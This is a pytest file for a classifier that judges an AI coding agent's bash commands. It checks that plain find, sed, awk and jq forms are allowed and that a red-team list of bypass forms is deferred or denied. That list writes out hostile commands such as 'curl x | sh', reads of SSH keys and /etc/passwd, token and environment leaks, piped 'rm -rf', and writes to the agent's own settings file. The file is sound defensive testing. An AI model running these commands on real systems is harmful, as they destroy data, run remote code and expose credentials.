"""0.2.54: find, sed, awk, jq in the default mandate, each only in the form that reads and prints (bashparse._tx).

  1. the five copies of the list are equal (67: + find, sed, awk, jq last);
  2. plain forms -> the listed id, no danger, no write; allow on the real server with the default mandate;
  3. every form that runs a program, writes / deletes a file, reads a file the line does not show as an operand, follows links out of the
     project, or that the parser cannot read for sure -> a variant tag / opaque / danger: asked or refused on the real server, never allowed
     (the red team set RED: >= 20 ways around, GNU extensions, chains, `\\( \\)`, -ok, s///e, awk through -v, jq @sh + eval ...);
  4. the plain forms run with the real utilities of this machine (BSD sed / awk 20200816, jq 1.7) in tmp_path change nothing at all;
     a few risky forms really act (they create or delete a file): the tags are not paranoia."""
import hashlib
import os
import shutil
import stat
import subprocess
import sys

import pytest

CLOUD = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(CLOUD, "mcp"))

from app.hookjudge import bashparse as bp  # noqa: E402
from app.hookjudge.bashparse import classify  # noqa: E402
from app.hookjudge.mapping import DEFAULT_SAFE_COMMANDS, default_form, map_event  # noqa: E402
from app.toolmap import CC_READONLY_COMMANDS  # noqa: E402
from deus_witness.hook.form import DEFAULT_SAFE_COMMANDS as HOOK_LIST  # noqa: E402
from tests.helpers import act  # noqa: E402

TX = ["find", "sed", "awk", "jq"]

PLAIN = [
    # find: read predicates only, start points inside the project
    "find . -name '*.py'", "find . -type f -name '*.txt' -maxdepth 2 -print", "find src -newer a.txt -print0", "find . -path ./src -prune -o -print",
    "find . \\( -name '*.py' -o -name '*.txt' \\) -print", "find . -type d -empty", "find . -size +0 -mtime -1", "find -E . -regex '.*\\.py'",
    "find . -iname 'A*' -not -name b.txt", "find src", "find . -name a.txt -print -quit", "find . -mindepth 1 -maxdepth 1 -type f | sort",
    # sed: scripts that only print
    "sed -n '1,2p' a.txt", "sed 's/a/b/g' a.txt", "sed -e 's/a/b/' -e '/x/d' a.txt", "sed -E 's/(a)+/X/' a.txt", "sed 's/$/;/' a.txt",
    "sed -n '/a/{p;q;}' a.txt", "sed ':a;N;$!ba;s/\\n/ /g' a.txt", "sed '1!G;h;$!d' a.txt", "sed 's|/|_|g' a.txt", "sed 'y/abc/ABC/' a.txt",
    "sed -n '$=' a.txt", "sed 's/a/b/w /dev/stdout' a.txt", "sed '/^#/d;/^$/d' a.txt", "cat a.txt | sed 's/a/A/'",
    # awk: no system(), no pipe, no file redirection, no getline < file
    "awk '{print $1}' a.txt", "awk -F, '{print $2}' a.txt", "awk '/a|b/' a.txt", "awk '$1 ~ /x|y/ {print $2}' a.txt", "awk 'NR > 1' a.txt",
    "awk '{s += length($0)} END {print s}' a.txt", "awk -v n=2 'NR <= n' a.txt", "awk '{print $1, ($2 > 3)}' a.txt",
    "awk 'BEGIN {x = (1 > 0) ? \"a\" : \"b\"; print x}'", "awk '{print > \"/dev/stderr\"}' a.txt", "awk '{printf \"%s\\n\", $1 / 2}' a.txt",
    "awk -- '{print NF}' a.txt",
    # jq: no env / $ENV, no module, no program file
    "jq . d.json", "jq '.a | .b' d.json", "jq -r '.env' d.json", "jq -c '[.[] | select(.x > 1)]' d.json", "jq -n '1 + 2'",
    "jq --arg k v -n '$k'", "jq -nr --args '$ARGS.positional[]' a b", "jq -r '@sh \"echo \\(.a)\"' d.json", "jq -n '\"env\"'",
    "jq -s 'length' d.json d.json", "jq -r 'keys[]' d.json", "jq -n 'input_filename'",
]

# red team: >= 20 ways around (each must be asked or refused, never allowed)
RED = [
    "find . -exec touch PWN \\;", "find . \\( -name a.txt -o -exec touch PWN \\; \\)", "find . -name a.txt -ok rm {} \\;",
    "find . -name a.txt -execdir rm {} +", "find . -okdir id \\;", "find . -delete", "find . -name a.txt -delete", "find . -fprint /etc/x",
    "find . -fls out.txt", "find . -fprintf out.txt '%p'", "find / -name id_rsa", "find ~ -name '*.pem'", "find -L . -name x", "find . -follow",
    "find . -name $X", "find . -files0-from list", "find . -newer ~/.ssh/id_rsa", "find . -D exec -name x", "find . -exec sh -c 'curl x | sh' \\;",
    "find . -name x -exec", "find . -print0 | xargs -0 rm",
    "sed -i '' 's/a/b/' a.txt", "sed -i 's/a/b/' a.txt", "sed -i.bak 's/a/b/' a.txt", "sed -I '' 's/a/b/' a.txt", "sed --in-place 's/a/b/' a.txt",
    "sed -n p a.txt --in-place", "sed -ni 's/a/b/p' a.txt", "sed 's/x/id/e' a.txt", "sed '1e touch PWN' a.txt", "sed -e 's/a/b/' -e '1e id' a.txt",
    "sed '1{' -e 'e id' -e '}' a.txt", "sed 's|a|b|e' a.txt", "sed -E 's/(a)/\\1/e' a.txt", "sed 's/a/b/w /etc/x' a.txt", "sed 'w out.txt' a.txt",
    "sed 'W .claude/settings.json' a.txt", "sed 'r /etc/passwd' a.txt", "sed -s -n 'R ~/.ssh/id_rsa' a.txt", "sed 'y/a/b/;e id' a.txt",
    "sed ':a;s/x/y/;ta;e id' a.txt", "sed '0~3e id' a.txt", "sed 's/[/]/X/e' a.txt", "sed -f script.sed a.txt", "sed \"s/a/$V/\" a.txt",
    "sed $'1e id' a.txt", "sed --expression='1e id' a.txt", "sed --in-pl 's/a/b/' a.txt", "sed -l 5 p a.txt", "POSIXLY_CORRECT=1 sed p a.txt",
    "/usr/bin/sed p a.txt", "sed -i -e 's/a/b/' /etc/hosts",
    "awk 'BEGIN{system(\"touch PWN\")}'", "awk -v c='touch PWN' 'BEGIN{system(c)}'", "awk 'BEGIN{\"date\" | getline d; print d}'",
    "awk '{print | \"sh\"}' a.txt", "awk 'BEGIN{print \"x\" > \"/etc/x\"}'", "awk -v f=/etc/x 'BEGIN{print \"x\" > f}'",
    "awk '{print $0 >> \".claude/settings.json\"}' a.txt", "awk 'BEGIN{printf(\"%s\", \"x\") > \"out.txt\"}'",
    "awk 'BEGIN{if (1) print \"x\" > \"out.txt\"}'", "awk 'BEGIN{while ((getline l < \"/etc/passwd\") > 0) print l}'",
    "awk 'BEGIN{getline l < \"~/.ssh/id_rsa\"}'", "awk 'BEGIN{print ENVIRON[\"HOME\"]}'", "awk 'BEGIN{ x = getline / 1; print \"id\" | \"sh\"; y = 1 / 1 }'",
    "awk 'BEGIN{\"id\" |& getline}'", "awk '@load \"x\"; BEGIN{}'", "awk -f prog.awk a.txt", "awk -F '' '{system(\"id\")}'", "gawk -e 'BEGIN{}'",
    "awk -- 'BEGIN{system(\"id\")}'", "awk \"{print $HOME}\" a.txt", "awk 'BEGIN{close(\"x\")}'",
    "jq -n env", "jq -n '$ENV.HOME'", "jq -n '\"\\(env.HOME)\"'", "jq -n '[env[]]'", "jq -n '{\"a\": env}'", "jq -n 'import \"x\" as y; y::f'",
    "jq -L /etc -n 'include \"a\"; f'", "jq --rawfile k ~/.ssh/id_rsa -n '$k'", "jq --slurpfile k /etc/passwd -n '$k'", "jq -f prog.jq d.json",
    "jq -n --arg t \"$GITHUB_TOKEN\" '$t'", "eval \"$(jq -r '@sh \"rm \\(.x)\"' d.json)\"", "jq -r '@sh \"rm -rf \\(.x)\"' d.json | sh",
    "jq \"$F\" d.json", "jq --wat . d.json",
]

H = "/Users/u-0254"          # the home of the classify tests: not a temp directory (tmp_path is one, and temp reads are allowed)

TAGS = [
    ("find . -exec touch PWN \\;", "find [exec]"), ("find . \\( -name a -o -exec id \\; \\)", "find [exec]"), ("find . -ok rm {} \\;", "find [exec]"),
    ("find . -delete", "find [delete]"), ("find . -fprint out", "find [write]"), ("find / -name x", "find [outside]"), ("find -L . -name x", "find [follow]"),
    ("find . -foo", "find [unsure]"), ("find . -name $X", "find [unsure]"),
    ("sed -i '' 's/a/b/' f", "sed [write]"), ("sed 's/x/id/e' f", "sed [exec]"), ("sed 'w out' f", "sed [write]"), ("sed 'r /etc/passwd' f", "sed [read, outside]"),
    ("sed 's/[/]/X/' f", "sed [unsure]"), ("sed 's/a/b/' f", "sed"), ("sed -n '/a/,/b/{p;}' f", "sed"),
    ("awk 'BEGIN{system(\"id\")}'", "awk [exec]"), ("awk '{print > \"o\"}' f", "awk [write]"), ("awk '{print | \"sh\"}' f", "awk [exec]"),
    ("awk '$3 > 100' f", "awk"), ("awk 'BEGIN{getline l < \"/etc/passwd\"}'", "awk [read, outside]"),
    ("jq . f", "jq"), ("jq -f p.jq f", "jq [unsure]"), ("jq -n 'import \"x\" as y; .'", "jq [read]"), ("jq --rawfile k /etc/passwd -n .", "jq [outside]"),
]


def _project(base):
    base = os.path.realpath(str(base))
    proj = os.path.join(base, "proj")
    os.makedirs(os.path.join(proj, "src"))
    os.makedirs(os.path.join(base, "home", ".ssh"))
    for name, text in (("a.txt", "a 1\nb 5\n"), ("b.txt", "b\n"), ("src/m.py", "x = 1\n"), ("d.json", '{"a": {"b": 1}, "env": "e", "x": 2}\n')):
        with open(os.path.join(proj, name), "w") as f:
            f.write(text)
    with open(os.path.join(base, "home", ".ssh", "id_rsa"), "w") as f:
        f.write("KEY\n")
    return proj


def _env(base):
    return {"PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "HOME": os.path.join(base, "home"), "LC_ALL": "C"}


def _snapshot(base):
    out = {}
    for root, dirs, files in os.walk(base):
        for n in dirs + files:
            p = os.path.join(root, n)
            st = os.lstat(p)
            if stat.S_ISLNK(st.st_mode):
                out[p] = ("link", os.readlink(p))
            elif stat.S_ISDIR(st.st_mode):
                out[p] = ("dir", stat.S_IMODE(st.st_mode))
            else:
                out[p] = ("file", stat.S_IMODE(st.st_mode), st.st_mtime_ns, hashlib.sha256(open(p, "rb").read()).hexdigest())
    return out


def _send(client, hdr, cmd, proj, owner=None):
    out = []
    for m in map_event({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": proj}):
        r = act(client, hdr, m.tool, m.args).json()
        out.append((m.tool, r["verdict"], r["reason"]))
        if owner is not None and r["verdict"] == "defer":
            assert owner.approve(r["rid"]).status_code == 200     # clears the queue: every line is judged on its own (no APPROVAL_RATE)
    return out


def test_five_copies_one_list():
    assert list(CC_READONLY_COMMANDS) == DEFAULT_SAFE_COMMANDS == HOOK_LIST
    assert DEFAULT_SAFE_COMMANDS[63:67] == TX and len(set(DEFAULT_SAFE_COMMANDS)) == 95
    web = open(os.path.join(CLOUD, "web", "js", "mandate_form.js")).read()
    html = open(os.path.join(CLOUD, "web", "mandate.html")).read()
    assert ", ".join(DEFAULT_SAFE_COMMANDS) + '"' in html
    assert "'git rm',\n  'find', 'sed', 'awk', 'jq'," in web       # 0.2.89: the read-only diagnostics follow
    assert default_form("/proj")["command"]["allow"] == DEFAULT_SAFE_COMMANDS + ["(code in the strict sandbox)"]   # 0.2.82: + the code option entry
    assert len(PLAIN) >= 50 and len(RED) >= 60


@pytest.mark.parametrize("cmd", PLAIN)
def test_plain_form_is_the_listed_id(cmd, tmp_path):
    proj = _project(tmp_path)
    c = classify(cmd, proj, H, project=proj)
    assert set(c.heads) <= set(DEFAULT_SAFE_COMMANDS) and not c.danger and not c.writes and not c.opaque, (cmd, c.heads, c.danger, c.writes)


@pytest.mark.parametrize("cmd", RED)
def test_red_team_form_is_never_the_plain_listed_id(cmd, tmp_path):
    proj = _project(tmp_path)
    c = classify(cmd, proj, H, project=proj)
    plain = set(c.heads) <= set(DEFAULT_SAFE_COMMANDS)
    assert not plain or c.danger or c.opaque, (cmd, c.heads)


@pytest.mark.parametrize("cmd,head", TAGS)
def test_the_tag_says_why(cmd, head, tmp_path):
    proj = _project(tmp_path)
    assert classify(cmd, proj, H, project=proj).heads == [head]


def test_escaped_and_quoted_operators_are_words():
    """`\\(`, `\\;`, `';'`, `'|'` are words for bash: before 0.2.54 shlex made them operators (`find . \\( ... \\)` was three commands)."""
    for cmd, heads in (("find . \\( -name a -o -name b \\) -print", ["find"]), ("find . -exec cat {} ';'", ["find [exec]"]),
                       ("grep '|' a.txt", ["grep"]), ("echo ';' && ls", ["echo", "ls"]), ("echo \"a;b\"", ["echo"])):
        assert classify(cmd, "/proj", "/home/u", project="/proj").heads == heads, cmd
    c = classify("echo \ue000", "/proj", "/home/u", project="/proj")
    assert c.opaque                                           # the private-use characters of the mask are refused in the input
    assert classify("\"\" ls", "/proj", "/home/u").opaque      # an empty command name is not read as `ls`
    assert classify("awk -F '' '{system(\"id\")}'", "/proj", "/home/u", project="/proj").heads == ["awk [exec]"]   # '' is a word


def test_writes_are_writes_and_secrets_are_secrets(tmp_path):
    proj = _project(tmp_path)
    home = H
    for cmd, w in (("find . -fprint /etc/x", "/etc/x"), ("sed 's/a/b/w /etc/y' a.txt", "/etc/y"), ("awk 'BEGIN{print 1 > \"/etc/z\"}'", "/etc/z"),
                   ("sed -i -e 's/a/b/' /etc/hosts", "/etc/hosts")):
        assert os.path.realpath(w) in classify(cmd, proj, home, project=proj).writes, cmd
    for cmd in ("jq -n env", "awk 'BEGIN{print ENVIRON[\"X\"]}'", "jq --rawfile k ~/.ssh/id_rsa -n .", "find . -newer ~/.ssh/id_rsa",
                "sed 'r ~/.ssh/id_rsa' a.txt"):
        assert any(d.startswith("secrets") for d in classify(cmd, proj, home, project=proj).danger), cmd
    for cmd in ("sed -f s.sed a.txt", "awk -f p.awk a.txt"):
        assert classify(cmd, proj, home, project=proj).opaque, cmd


def test_on_the_server_plain_forms_run_red_team_forms_do_not(client, owner, tmp_path):
    proj = _project(tmp_path)
    ag, hdr = owner.new_agent("claude-code", "cc")
    owner.mandate(ag["id"], default_form(proj))
    for cmd in PLAIN:
        r = _send(client, hdr, cmd, proj)
        assert r and all(v == "allow" for _, v, _ in r), (cmd, r)
    for cmd in RED:
        r = _send(client, hdr, cmd, proj, owner)
        assert any(v in ("defer", "deny") for _, v, _ in r), (cmd, r)          # asked (defer) or refused (deny), never unasked
        assert not all(v == "allow" for _, v, _ in r), (cmd, r)
        assert not any(why in ("AGENT_FROZEN", "APPROVAL_RATE") for _, _, why in r), (cmd, r)


def test_no_project_allowance_for_a_variant():
    from app import allowances as al
    for cid in ("find [exec]", "sed [write]", "awk [exec]", "jq [unsure]", "find [outside]"):
        assert al.why_not(cid), cid


NEEDS = all(shutil.which(x) for x in ("bash", "find", "sed", "awk")) and os.path.exists("/usr/bin/sed")


@pytest.mark.skipif(not NEEDS, reason="needs bash, find, sed, awk")
@pytest.mark.parametrize("cmd", PLAIN)
def test_plain_forms_with_the_real_utilities_change_nothing(cmd, tmp_path):
    if cmd.startswith("jq") and not shutil.which("jq"):
        pytest.skip("no jq")
    base = os.path.realpath(str(tmp_path))
    proj = _project(base)
    env = _env(base)
    env["PATH"] = os.path.dirname(shutil.which("jq") or "/usr/bin/jq") + ":" + env["PATH"]
    before = _snapshot(base)
    r = subprocess.run(["bash", "-c", cmd], cwd=proj, env=env, capture_output=True, text=True, timeout=60)
    assert _snapshot(base) == before, (cmd, r.stderr)        # read and print only: nothing in or outside the project changes


@pytest.mark.skipif(not NEEDS, reason="needs bash, find, sed, awk")
@pytest.mark.parametrize("cmd,effect", [("find . -name a.txt -exec touch PWN \\;", "PWN"), ("find . \\( -name a.txt -o -exec touch PWN \\; \\)", "PWN"),
                                        ("awk 'BEGIN{system(\"touch PWN\")}'", "PWN"), ("awk -v c='touch PWN' 'BEGIN{system(c)}'", "PWN"),
                                        ("awk 'BEGIN{print \"x\" | \"touch PWN\"}'", "PWN"), ("awk 'BEGIN{print \"x\" > \"PWN\"}'", "PWN"),
                                        ("sed -n 'w PWN' a.txt", "PWN"), ("sed -i '' 's/a/PWN/' a.txt", "a.txt"),
                                        ("find . -name b.txt -delete", "-b.txt")])
def test_risky_forms_really_act_on_this_machine(cmd, effect, tmp_path):
    base = os.path.realpath(str(tmp_path))
    proj = _project(base)
    r = subprocess.run(["bash", "-c", cmd], cwd=proj, env=_env(base), capture_output=True, text=True, timeout=60)
    if effect.startswith("-"):
        assert not os.path.exists(os.path.join(proj, effect[1:])), (cmd, r.stderr)
    elif effect == "a.txt":
        assert "PWN" in open(os.path.join(proj, "a.txt")).read(), (cmd, r.stderr)
    else:
        assert os.path.exists(os.path.join(proj, effect)), (cmd, r.stderr)
    c = classify(cmd, proj, _env(base)["HOME"], project=proj)
    assert not set(c.heads) <= set(DEFAULT_SAFE_COMMANDS) or c.danger, (cmd, c.heads)


def test_parsers_fail_closed_on_odd_scripts():
    for s in ("s/a/b", "s/a/b/q", "k", "1,", "/a", "s\\a\\b\\", "y/ab/c"):
        assert any(k == "unsure" for k, _ in bp._sed_script(s)), s
    for p in ('{print "a}', "/abc", 'BEGIN{print "x" > "/dev/stderr"'):
        c = classify("awk '%s' a.txt" % p, "/proj", "/home/u", project="/proj")
        assert c.heads != ["awk"] or c.opaque or c.danger, p
